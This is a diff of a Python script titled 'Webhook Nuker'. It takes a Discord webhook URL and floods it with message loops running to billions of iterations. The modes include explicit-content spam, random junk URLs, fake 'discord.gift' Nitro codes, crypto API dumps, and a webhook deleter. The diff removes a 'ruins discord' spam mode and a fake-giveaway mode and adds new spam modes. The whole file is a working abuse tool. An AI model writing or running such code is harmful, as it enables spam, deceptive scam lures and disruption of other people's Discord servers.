@@ -5,15 +5,14 @@ import random
 print('''
 
 Webhook Nuker
-v1.2.5 FMH
+v1.3.2 FMH
 
-1 = hentai hook (and normal)
+1 = hentai hook (and normal) 
 2 = jibberish spam
-3 = hellish spam (ruins discord)
-4 = fake gw spam (lags servers)
-5 = http url spam (why)
+5 = http url spam (funny)
 6 = webhook deleter 
- 
+7 = crypto spammer 
+8 = nitro code spammer
 
 ''')
 maaain = input("Enter Number : ")
@@ -59,60 +58,25 @@ elif maaain =="2":
     print(f"Message Sent - {h}")
     if h.status_code == 429:    
        print(f"Rate Limited {h}")
-       
-elif maaain =="3":
-  webhook = input("Enter The Entire Discord Webhook : ")
-  ee = int(999999900)
-  name7 = "HELl"
-  for i in range(ee):
-    cat = requests.get("https://aws.random.cat/meow?ref=apilist.fun")
-    dog = requests.get("https://dog.ceo/api/breeds/image/random")
-    random1 = requests.get("https://www.boredapi.com/api/activity")
-    random2 = requests.get("https://randomuser.me/api/")
-    nums = requests.get("http://numbersapi.com/random/math")
-    
-    
-    
-    
-    messaage = (f"HEHE HEHE @everyone {cat.text}{dog.text}{random1.text}{random2.text}{nums.text} Snake in by booter")
-    h = requests.post(webhook, json={"content": str(messaage), "name": str(name7), "avatar_url": "https://cdn.discordapp.com/attachments/933540730083872889/935019209652596736/01d8Ghah.jpg"})
-    time.sleep(.5)
-    print(f"Message Sent - {h}")
-    if h.status_code == 429:    
-       print(f"Rate Limited {h}")
-    if h.status_code == 400:
-      print("More Then 200 Caracters Dectected!")
-elif maaain =="4":
-  name7 = "discord"
-  webhook = input("Enter The Entire Discord Webhook : ")
-  ee = int(999999900)
-  for i in range(ee):
-    cood43 = "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")for _ in range(16))        
-    message = f"@everyone you won **lucky webhook week** and got **FREE nitro premium** discord.gift/{cood43} learn more about discord.gift/winners on the offical discord site https://media.discordapp.net/attachments/958026963581300768/958058952510283837/9cca3b40-e1f0-4d27-b42c-d8897b6cf95d.gif discord.gift/tos123 for more giveaways "
-    h = requests.post(webhook, json={"content": str(message), "name": str(name7), "avatar_url": "https://cdn.discordapp.com/attachments/933540730083872889/935019209652596736/01d8Ghah.jpg"})
-    print(f"Message Sent - {h}")
-    if h.status_code == 429:    
-       print(f"Rate Limited {h}")
-    if h.status_code == 400:
-      print("More Then 2000 Caracters Dectected!")
 elif maaain =="5":
   webhook = input("Enter The Full Webhook Url : ")
+  mess = input("Enter The Message : ")
   numm = int(9999999999)
   for i in range(numm):
     domain = random.choice(['.net','.com'])
-    urlz = random.choice(['people','family','apple','cart','shoe','pro','sports','home','smile','read','hat','boat'])
+    urlz = random.choice(['people','family','apple','cart','shoe','pro','sports','home','smile','read','hat','boat','dot','data','font'])
     hb = "".join(random.choice("abcdefghijklmnopqrstuvwxyz")for _ in range(1))
     domain2 = random.choice(['.net','.com'])
-    urlz2 = random.choice(['dog','cat','sex','file','text','map','tub','fly','mob','got','weed','space','lo'])
+    urlz2 = random.choice(['dog','cat','sex','file','text','map','tub','fly','mob','got','weed','space','lo','call','and','wood'])
     hb2 = "".join(random.choice("abcdefghijklmnopqrstuvwxyz")for _ in range(1))       
     domain3 = random.choice(['.net','.com'])    
     hb3 = "".join(random.choice("abcdefghijklmnopqrstuvwxyz")for _ in range(1))
-    urlz3 = random.choice(['pop','job','bus','rod','new','music','mad','disk','ok','chat','bomb'])
+    urlz3 = random.choice(['pop','job','bus','rod','new','music','mad','disk','ok','chat','bomb','pa','star','web','toy','fun'])
     name7 = "h"
     stat1 = (f"https://{urlz}{hb}{domain}")
     stat2 = (f"https://{urlz2}{hb2}{domain2}")
     stat3 = (f"https://{urlz3}{hb3}{domain3}")
-    message = f"DNS GATEWAY : {stat1} - {stat2} - {stat3} " 
+    message = f" {mess} : {stat1} - {stat2} - {stat3} " 
   
     h = requests.post(webhook, json={"content": str(message), "name": str(name7), "avatar_url": "https://cdn.discordapp.com/attachments/933540730083872889/935019209652596736/01d8Ghah.jpg"})
     time.sleep(.5)
@@ -122,17 +86,47 @@ elif maaain =="5":
     
 elif maaain =="6":
   webhook = input("Enter The Full Webhook Url : ")
-  numm = int(9999999999)
   requests.delete(webhook)
   print("Webhook Deleted Checking To Make Sure Now")
   b = requests.get(webhook)
   print(f"{b.text}")
   
+elif maaain =="7":
+  webhook = input("Enter The Full Webhook Url : ")
+  numm = int(9999999999)
+  for i in range(numm):    
+    randy = random.randint(1, 2000)
+    list = (['https://api.coindesk.com/v1/bpi/currentprice.json','https://open.er-api.com/v6/latest/USD','https://api.coingecko.com/api/v3/exchanges?per_page=1&page=250','https://api.coinpaprika.com/v1/global','https://api.coinlore.net/api/global/',f'https://api.coinlore.net/api/tickers/?start={randy}&limit=1'])
+    ok = random.choice(list)
+    message = requests.get(ok)
+    h = requests.post(webhook, json={"content": str(message.text), "name": "Coin Bot", "avatar_url": "https://media.discordapp.net/attachments/959155376970924042/959157347375284224/716DBFF-DCBE-46E2-90B2-1A34FECFBC13.jpg"})
+    time.sleep(.5)
+    print(f"Message Sent - {h}")
+    if h.status_code == 429:    
+       print(f"Rate Limited {h}")
+    if h.status_code == 400:
+      print("More Then 2000 Caracters Dectected!")
+elif maaain =="8":
+ webhook = input("Enter The Full Webhook Url : ")
+ mess = input("Enter Message To Send : ")
+ numm = int(9999999999)
+ for i in range(numm):
+   cood43 = "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(16))  
+   cood44 = "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(16)) 
+   cood45 = "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(16))    
+   message = f" {mess} : discord.gift/{cood43} - discord.gift/{cood44} -  discord.gift/{cood45}"
+   h = requests.post(webhook, json={"content": str(message), "name": "Nitro", "avatar_url": "https://media.discordapp.net/attachments/961457988441374810/961617389294846002/IMG_0199.jpg"})
+   time.sleep(.5)
+   print(f"Message Sent - {h}")
+   if h.status_code == 429:    
+      print(f"Rate Limited {h}")
+   if h.status_code == 400:
+     print("More Then 2000 Caracters Dectected!")
+    
+ 
   
   
   
 else:
   print("Invalid Responce")
 
-
-       
